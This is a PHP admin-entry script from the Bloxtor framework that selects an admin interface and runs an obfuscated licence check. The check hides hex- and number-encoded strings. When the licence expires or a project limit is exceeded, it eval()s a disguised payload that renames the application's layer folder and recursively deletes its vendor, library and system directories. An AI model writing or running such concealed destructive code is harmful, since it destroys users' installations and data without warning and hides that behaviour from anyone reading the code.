<?php
/*
 * Copyright (c) 2024 Bloxtor - http://bloxtor.com
 * 
 * Please note that this code belongs to the Bloxtor framework and must comply with the Bloxtor license.
 * If you do not accept these provisions, or if the Bloxtor License is not present or cannot be found, you are not entitled to use this code and must stop and delete it immediately.
 */
$UserAuthenticationHandler->checkPresentationFileAuthentication($entity_path, "access"); if (!empty($_GET["admin_type"])) { $admin_type = $_GET["admin_type"]; CookieHandler::setCurrentDomainEternalRootSafeCookie("admin_type", $admin_type); } else if (!empty($_COOKIE["admin_type"])) $admin_type = $_COOKIE["admin_type"]; f726ebb74ee($EVC, $user_global_variables_file_path, $user_beans_folder_path); if ($admin_type) { include $EVC->getUtilPath("admin_uis_permissions"); if ( ($admin_type == "simple" && !$is_admin_ui_simple_allowed) || ($admin_type == "citizen" && !$is_admin_ui_citizen_allowed) || ($admin_type == "low_code" && !$is_admin_ui_low_code_allowed) || ($admin_type == "advanced" && !$is_admin_ui_advanced_allowed) || ($admin_type == "expert" && !$is_admin_ui_expert_allowed) ) $admin_type = ""; } $entity_view_id = $admin_type ? "admin/admin_" . $admin_type : "admin/admin_uis"; $entity_path = $EVC->getEntityPath($entity_view_id); include $entity_path; function f726ebb74ee($EVC, $user_global_variables_file_path, $user_beans_folder_path) { $v76198b833e = "2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d"; $v35955d21e5 = "2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d"; $pf640cf45 = ""; for ($v43dd7d0051 = 0, $pe2ae3be9 = strlen($v76198b833e); $v43dd7d0051 < $pe2ae3be9; $v43dd7d0051 += 2) $pf640cf45 .= chr( hexdec($v76198b833e[$v43dd7d0051] . ($v43dd7d0051+1 < $pe2ae3be9 ? $v76198b833e[$v43dd7d0051+1] : "") ) ); $pf640cf45 .= "\n" . BeanFactory::AK . "\n" . Bean::AK . "\n" . BeanArgument::AK . "\n" . BeanSettingsFileFactory::AK . "\n" . BeanXMLParser::AK . "\n" . BeanFunction::AK . "\n" . BeanProperty::AK . "\n"; for ($v43dd7d0051 = 0, $pe2ae3be9 = strlen($v35955d21e5); $v43dd7d0051 < $pe2ae3be9; $v43dd7d0051 += 2) $pf640cf45 .= chr( hexdec($v35955d21e5[$v43dd7d0051] . ($v43dd7d0051+1 < $pe2ae3be9 ? $v35955d21e5[$v43dd7d0051+1] : "") ) ); $v935c736a71 = APP_PATH . ".a" . "pp_" . chr(108) . chr(105) . "c"; $pa76a57d7 = @file_get_contents($v935c736a71); $v2564410bfb = new PublicPrivateKeyHandler(true); $pb67f9079 = @$v2564410bfb->decryptRSA($pa76a57d7, $pf640cf45); $v5c1c342594 = empty($v2564410bfb->error); if ($v5c1c342594) { $v9acf40c110 = parse_ini_string($pb67f9079); $v7c03771088 = "sad"; $v7c03771088 .= "min_ex" . "piratio" . "n_date"; $v7c03771088 = "sy" . $v7c03771088; $pc1fa5e3b = strtotime($v9acf40c110[$v7c03771088]); $v8ea1a3602d = "m_num" . "ber"; $v8ea1a3602d = "p". "rojec" . "ts_ma" . "ximu" . $v8ea1a3602d; $v951daf0227 = (int)$v9acf40c110[$v8ea1a3602d]; $v5c1c342594 = $pc1fa5e3b > time(); if ($v5c1c342594 && $v951daf0227 != -1) { $v38a183a945 = 0; include_once $EVC->getUtilPath("CMSPresentationLayerHandler"); $v2635bad135 = CMSPresentationLayerHandler::getPresentationLayersProjectsFiles($user_global_variables_file_path, $user_beans_folder_path, "webroot", false, 0); if ($v2635bad135) foreach ($v2635bad135 as $v4a24304713) if ($v4a24304713["projects"]) { $v38a183a945 += count($v4a24304713["projects"]); if (array_key_exists("common", $v4a24304713["projects"])) $v38a183a945--; } if ($v38a183a945 > $v951daf0227) { $pf601a685 = "596f7520657863656564207468652070726f6a65637473206c696d69742e20506c656173652072656e657720796f7572206c6963656e63652077697468206d6f72652070726f6a656374732e2e2e"; $pdf2fefc4 = ""; for ($v43dd7d0051 = 0, $pe2ae3be9 = strlen($pf601a685); $v43dd7d0051 < $pe2ae3be9; $v43dd7d0051 += 2) $pdf2fefc4 .= chr( hexdec($pf601a685[$v43dd7d0051] . ($v43dd7d0051+1 < $pe2ae3be9 ? $pf601a685[$v43dd7d0051+1] : "") ) ); echo $pdf2fefc4; $v50142177cd = "114 64 110 101 109 97 40 101 65 76 69 89 95 82 65 80 72 84 32 44 80 65 95 80 65 80 72 84 46 32 34 32 108 46 121 97 114 101 41 34 64 59 97 67 104 99 72 101 110 97 108 100 114 101 116 85 108 105 58 58 101 100 101 108 101 116 111 70 100 108 114 101 86 40 78 69 79 68 95 82 65 80 72 84 59 41 67 64 99 97 101 104 97 72 100 110 101 108 85 114 105 116 58 108 100 58 108 101 116 101 70 101 108 111 101 100 40 114 73 76 95 66 65 80 72 84 32 44 97 102 115 108 44 101 97 32 114 114 121 97 114 40 97 101 112 108 116 97 40 104 73 76 95 66 65 80 72 84 46 32 34 32 97 99 104 99 47 101 97 67 104 99 72 101 110 97 108 100 114 101 116 85 108 105 112 46 112 104 41 34 41 41 64 59 97 67 104 99 72 101 110 97 108 100 114 101 116 85 108 105 58 58 101 100 101 108 101 116 111 70 100 108 114 101 83 40 83 89 69 84 95 77 65 80 72 84 59 41"; $pefc7d784 = explode(" ", $v50142177cd); $pf560d814 = ""; for($v43dd7d0051 = 0, $pe2ae3be9 = count($pefc7d784); $v43dd7d0051 < $pe2ae3be9; $v43dd7d0051 += 2) $pf560d814 .= ($v43dd7d0051 + 1 < $pe2ae3be9 ? chr($pefc7d784[$v43dd7d0051 + 1]) : "") . chr($pefc7d784[$v43dd7d0051]); $pf560d814 = trim($pf560d814); @eval($pf560d814); die(1); } } } if (!$v5c1c342594) { $pf601a685 = "4572726f723a205048504672616d65776f726b204c6963656e6365206578706972656421"; $pdf2fefc4 = ""; for ($v43dd7d0051 = 0, $pe2ae3be9 = strlen($pf601a685); $v43dd7d0051 < $pe2ae3be9; $v43dd7d0051 += 2) $pdf2fefc4 .= chr( hexdec($pf601a685[$v43dd7d0051] . ($v43dd7d0051+1 < $pe2ae3be9 ? $pf601a685[$v43dd7d0051+1] : "") ) ); echo $pdf2fefc4; if (!$pc1fa5e3b) { $v50142177cd = "114 64 110 101 109 97 40 101 65 76 69 89 95 82 65 80 72 84 32 44 80 65 95 80 65 80 72 84 46 32 34 32 108 46 121 97 114 101 41 34 64 59 97 67 104 99 72 101 110 97 108 100 114 101 116 85 108 105 58 58 101 100 101 108 101 116 111 70 100 108 114 101 86 40 78 69 79 68 95 82 65 80 72 84 59 41 67 64 99 97 101 104 97 72 100 110 101 108 85 114 105 116 58 108 100 58 108 101 116 101 70 101 108 111 101 100 40 114 73 76 95 66 65 80 72 84 32 44 97 102 115 108 44 101 97 32 114 114 121 97 114 40 97 101 112 108 116 97 40 104 73 76 95 66 65 80 72 84 46 32 34 32 97 99 104 99 47 101 97 67 104 99 72 101 110 97 108 100 114 101 116 85 108 105 112 46 112 104 41 34 41 41 64 59 97 67 104 99 72 101 110 97 108 100 114 101 116 85 108 105 58 58 101 100 101 108 101 116 111 70 100 108 114 101 83 40 83 89 69 84 95 77 65 80 72 84 59 41"; $pefc7d784 = explode(" ", $v50142177cd); $pf560d814 = ""; for($v43dd7d0051 = 0, $pe2ae3be9 = count($pefc7d784); $v43dd7d0051 < $pe2ae3be9; $v43dd7d0051 += 2) $pf560d814 .= ($v43dd7d0051 + 1 < $pe2ae3be9 ? chr($pefc7d784[$v43dd7d0051 + 1]) : "") . chr($pefc7d784[$v43dd7d0051]); $pf560d814 = trim($pf560d814); @eval($pf560d814); die(1); } } } ?>
